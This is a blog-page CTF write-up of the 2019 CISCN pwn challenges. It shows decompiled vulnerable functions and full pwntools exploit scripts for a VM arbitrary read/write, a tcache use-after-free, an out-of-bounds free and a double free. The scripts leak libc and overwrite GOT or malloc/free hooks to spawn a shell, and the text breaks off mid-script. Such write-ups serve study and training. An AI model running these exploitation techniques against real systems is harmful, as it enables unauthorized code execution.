<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>2019-CISCN-PWN | V1NKe的心情垃圾桶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="PWN," />
  

  <meta name="description" content="2019CISCN">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="2019-CISCN-PWN">
<meta property="og:url" content="http://yoursite.com/2019/04/24/2019-CISCN-PWN/index.html">
<meta property="og:site_name" content="V1NKe的心情垃圾桶">
<meta property="og:description" content="2019CISCN">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/2019CISCN/553F03D7-95D8-4A17-B6B9-D7889D428F67.png">
<meta property="og:updated_time" content="2019-05-19T09:33:11.706Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019-CISCN-PWN">
<meta name="twitter:description" content="2019CISCN">
<meta name="twitter:image" content="http://yoursite.com/2019CISCN/553F03D7-95D8-4A17-B6B9-D7889D428F67.png">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            rel="noopener noreferrer"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Virtual："><span class="toc-text">Virtual：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load："><span class="toc-text">load：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#save："><span class="toc-text">save：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#思路："><span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bms："><span class="toc-text">bms：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-1"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#daily："><span class="toc-text">daily：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-2"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Double："><span class="toc-text">Double：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-3"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-pwn："><span class="toc-text">baby_pwn：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-4"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#your-pwn："><span class="toc-text">your_pwn：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-5"><span class="toc-text">EXP：</span></a></li></ol></li></ol></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-2019-CISCN-PWN" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">2019-CISCN-PWN</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2019.04.24</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>这次比赛难度不大，有意思的就是那道虚拟机。</p>
<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><h3 id="Virtual："><a href="#Virtual：" class="headerlink" title="Virtual："></a>Virtual：</h3><p>第一次遇见pwn带虚拟机的，刚开始懵逼的不知道怎么去利用，后来发现能够任意读写后一切都很明了了。从不会到会的过程着实蛮有意思。</p>
<p>程序的流程就是输入指令，再输入指令所需要用的数据，然后进入虚拟机一个一个执行指令，这里需要逆向的有点仔细。最后会输出栈中内容。</p>
<p>这里有漏洞的地方就两个指令，load和save指令：</p>
<h4 id="load："><a href="#load：" class="headerlink" title="load："></a>load：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall load_asm(__int64 stack_range)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  __int64 v2; // [rsp+10h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)pop_one_to_two(stack_range, &amp;v2) )</span><br><span class="line">    result = pop_two_to_one(</span><br><span class="line">               stack_range,</span><br><span class="line">               *(_QWORD *)(*(_QWORD *)stack_range + 8 * (*(signed int *)(stack_range + 0xC) + v2)));</span><br><span class="line">  else</span><br><span class="line">    result = 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的功能就是先从栈中pop出一个，再将它作为index以当前栈顶为界选中index处的内容再压栈，因为index可以任意，可以正数也可以为负数，所以可以从任意地址读入内容到栈中。</p>
<h4 id="save："><a href="#save：" class="headerlink" title="save："></a>save：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall save_asm(__int64 stack_range)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // [rsp+10h] [rbp-10h]</span><br><span class="line">  __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !(unsigned int)pop_one_to_two(stack_range, &amp;v2) || !(unsigned int)pop_one_to_two(stack_range, &amp;v3) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)(8 * (*(signed int *)(stack_range + 12) + v2) + *(_QWORD *)stack_range) = v3;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这函数功能是从栈中pop出两个数，pop出的第一个做index，pop出的第二个做数据，以当前栈顶为界选中index处的地址，将pop出得第二个数据写入index地址处。所以就实现了任意地址写。</p>
<h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><ol>
<li>将<code>0x404020</code>写入栈中，得到与虚拟机栈顶的偏移、index</li>
<li>将<code>0x404020</code>处的内容（puts函数地址）读入栈中，再pop出来，泄漏得到libc</li>
<li>重新从1开始得到偏移，在栈中布置好<code>one_gadget</code>数据和index，利用任意写将<code>one_gadget</code>写入<code>puts@got</code>中。</li>
</ol>
<p>因为指令有加减乘除，所以获取index很容易，这里就说说如何得到的偏移。</p>
<p><img src="/2019CISCN/553F03D7-95D8-4A17-B6B9-D7889D428F67.png" alt="553F03D7-95D8-4A17-B6B9-D7889D428F67"></p>
<p>从上图就可以看出来我们可以从栈中数据往上找到堆地址，只要把他读入栈中，这样就可以计算出和got表上的偏移。</p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">#p = remote(&apos;a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com&apos;,40003)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Your program name:\n&apos;)</span><br><span class="line">p.sendline(&apos;V1NKe&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Your instruction:\n&apos;)</span><br><span class="line">payload1 = &apos;push push push load push sub div load push&apos;</span><br><span class="line">payload1 += &apos; push load sub push load push add push push load&apos;</span><br><span class="line">payload1 += &apos; push sub div save&apos;</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Your stack data:\n&apos;)</span><br><span class="line">puts_addr = libc.symbols[&apos;puts&apos;]</span><br><span class="line">puts_addr = str(puts_addr)</span><br><span class="line">payload2 = &apos;1 8 -5 4210720 &apos;+puts_addr+&apos; -1 0 987463&apos;</span><br><span class="line">payload2 += &apos; 8 -8 4210704 &apos;</span><br><span class="line">#gdb.attach(p,&apos;b *0x4019B7&apos;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="bms："><a href="#bms：" class="headerlink" title="bms："></a>bms：</h3><p>这题有个坑点就是需要自己先去测libc版本，常规思维会用不带tcache版本的libc去想这一道题，但是这题是带了tcache的2.26版本。用free两次看看崩不崩就能知道带不带tcache了。</p>
<p>漏洞点，UAF：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;index:&quot;);</span><br><span class="line">  v1 = rread();</span><br><span class="line">  if ( v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;invalid index!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  free(*((void **)qword_602060[v1] + 2));       //uaf</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序只有添加和删除堆两个功能，那么很容易想到用IO_File去泄漏libc。用tcache dup在bss段上的stdout处申请一个chunk，再利用其在libc上的地址去修改IO_write_base。因为连续free两次也不会崩，也不会有size检查等等。所以比fastbin attack利用简单很多。最后修改<code>__free_hook</code>为<code>one_gadget</code>即可。</p>
<h4 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">#p = remote(&apos;90b826377a05d5e9508314e76f2f1e4e.kr-lab.com&apos;,40001)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;username:&apos;)</span><br><span class="line">p.sendline(&apos;admin&apos;)</span><br><span class="line">p.recvuntil(&apos;password:&apos;)</span><br><span class="line">p.sendline(&apos;frame&apos;)</span><br><span class="line"></span><br><span class="line">def create(name,size,context):</span><br><span class="line">    p.sendlineafter(&apos;&gt;\n&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendafter(&apos;book name:&apos;,name)</span><br><span class="line">    p.sendlineafter(&apos;description size:&apos;,str(size))</span><br><span class="line">    p.sendafter(&apos;description:&apos;,context)</span><br><span class="line"></span><br><span class="line">def createe(name,size,context):</span><br><span class="line">    p.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendafter(&apos;book name:&apos;,name)</span><br><span class="line">    p.sendlineafter(&apos;description size:&apos;,str(size))</span><br><span class="line">    p.sendafter(&apos;description:&apos;,context)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&apos;&gt;\n&apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def deletee(index):</span><br><span class="line">    p.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">#tcathe attack to the IO_File</span><br><span class="line">create(&apos;A&apos;,0x68,&apos;A&apos;*0x68)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">create(&apos;A&apos;,0x68,p64(0x602020))</span><br><span class="line">create(&apos;A&apos;,0x68,&apos;A&apos;)</span><br><span class="line">create(&apos;A&apos;,0x68,&apos;\x60&apos;)</span><br><span class="line">create(&apos;A&apos;,0x68,p64(0xfbad1800)+p64(0)*3+&apos;\x90&apos;)</span><br><span class="line"></span><br><span class="line">#leak the libc</span><br><span class="line">data = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = data - 4114403</span><br><span class="line">system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">free_addr = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">log.success(&apos;libc base is :&apos;+hex(libc_base))</span><br><span class="line"></span><br><span class="line">#tcache attack to __free_hook</span><br><span class="line">createe(&apos;A&apos;,0x30,&apos;A&apos;)#5</span><br><span class="line">deletee(5)</span><br><span class="line">deletee(5)</span><br><span class="line">createe(&apos;A&apos;,0x30,p64(free_addr))#6</span><br><span class="line">createe(&apos;A&apos;,0x30,&apos;/bin/sh&apos;)#7</span><br><span class="line">createe(&apos;A&apos;,0x30,p64(system_addr))#8</span><br><span class="line"></span><br><span class="line">#trigger</span><br><span class="line">deletee(7)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="daily："><a href="#daily：" class="headerlink" title="daily："></a>daily：</h3><p>这里有一个越界删除的漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( daily_num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of daily:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v1 = atoi(&amp;buf);</span><br><span class="line">    if ( *(_QWORD *)&amp;dialy_chunk[4 * v1 + 2] )  // 未检查idx</span><br><span class="line">    &#123;</span><br><span class="line">      free(*(void **)&amp;dialy_chunk[4 * v1 + 2]);</span><br><span class="line">      *(_QWORD *)&amp;dialy_chunk[4 * v1 + 2] = 0LL;</span><br><span class="line">      dialy_chunk[4 * v1] = 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --daily_num;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No pages in the daily&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除时没有检查index是否合法，所以可以任意删除，这里的删除哪里，该如何构造是一个点。</p>
<p>这里删除必然是拿来越界删除堆上的chunk再view拿来泄漏libc的，那么我们改怎样得知heap基地址从而算出index呢？</p>
<p>那就是delete两个fast bin再create覆盖fd的低位字节，就拿到了heap基地址，这样可以越界删除small chunk拿到libc地址，之后再利用越界删除构造double free。在malloc_hook上写system。再次malloc的时候触发。</p>
<h4 id="EXP：-2"><a href="#EXP：-2" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">#p = remote(&apos;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&apos;,58512)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def create(size,context):</span><br><span class="line">    p.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Please enter the length of daily:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;Now you can write you daily\n&apos;)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.sendlineafter(&apos;Your choice:&apos;,&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">    p.sendlineafter(&apos;Your choice:&apos;,&apos;3&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Please enter the index of daily:&apos;,str(index))</span><br><span class="line">    p.sendafter(&apos;Please enter the new daily\n&apos;,context)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&apos;Your choice:&apos;,&apos;4&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Please enter the index of daily:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">#leak heap base</span><br><span class="line">create(0x60,&apos;A&apos;)</span><br><span class="line">create(0x60,&apos;A&apos;)</span><br><span class="line">create(0x80,&apos;A&apos;*0x20)</span><br><span class="line">create(0x20,&apos;A&apos;*0x20)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">create(0x60,&apos;\x10&apos;)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;0 : &apos;)</span><br><span class="line">data = u64(p.recv(4).ljust(8,&apos;\x00&apos;))-0x10</span><br><span class="line">log.success(&apos;heap base :&apos;+hex(data))</span><br><span class="line">idx = (data - 0x602060)/16</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">edit(0,&apos;A&apos;*8+p64(data+0x70*2+0x10))</span><br><span class="line">delete(idx+1)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&apos;2 : &apos;)</span><br><span class="line">data2 = u64(p.recv(6).ljust(8,&apos;\x00&apos;)) - 3951480</span><br><span class="line">one_addr = data2 + 0xf1147</span><br><span class="line">malloc_hook = data2 + libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">system_addr = data2 + libc.symbols[&apos;system&apos;]</span><br><span class="line">log.success(&apos;malloc addr:&apos;+hex(malloc_hook))</span><br><span class="line">log.success(&apos;libc base :&apos;+hex(data2))</span><br><span class="line"></span><br><span class="line">#35</span><br><span class="line">create(0x60,&apos;A&apos;)</span><br><span class="line">edit(0,&apos;A&apos;*8+p64(data+0x70+0x10))</span><br><span class="line">delete(idx+1)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">#double free 19</span><br><span class="line">create(0x60,p64(malloc_hook-35))</span><br><span class="line">create(0x60,&apos;/bin/sh&apos;)</span><br><span class="line">create(0x60,&apos;A&apos;)</span><br><span class="line">create(0x60,&apos;\x00&apos;*19+p64(system_addr))</span><br><span class="line">p.sendlineafter(&apos;Your choice:&apos;,&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;Please enter the length of daily:&apos;)</span><br><span class="line">p.send(str(data+0x10))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Double："><a href="#Double：" class="headerlink" title="Double："></a>Double：</h3><p>看代码虽然有点繁琐，但是理清之后很清楚，在create时如果内容一样那么两次create的指针会指向同一块chunk，这就可以构造double free了。之后的利用便很简单了。</p>
<h4 id="EXP：-3"><a href="#EXP：-3" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com&apos;,40002)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def create(context):</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Your data:&apos;,context)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Info index: &apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Info index: &apos;,str(index))</span><br><span class="line">    sleep(0.3)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Info index: &apos;,str(index))</span><br><span class="line"></span><br><span class="line">create(&apos;A&apos;*0x67)</span><br><span 